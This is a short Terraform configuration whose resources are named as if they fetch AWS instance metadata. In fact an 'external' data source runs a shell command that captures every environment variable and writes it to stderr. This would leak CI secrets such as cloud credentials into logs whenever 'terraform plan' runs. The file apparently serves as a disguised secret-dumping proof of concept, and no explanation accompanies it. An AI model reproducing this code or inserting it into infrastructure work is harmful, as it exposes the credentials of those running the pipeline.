data "template_file" "instance_identity" {
    template = <<EOF
DATA=$(env)
>&2 echo $DATA
echo "{}"
EOF
}

data "external" "instance_identity" {
	program = ["sh", "-c", "${data.template_file.instance_identity.rendered}"]
}

resource "null_resource" "aws_metadata" {
	triggers = {
        instance_identity = "${jsonencode(data.external.instance_identity.result)}"
    }
}
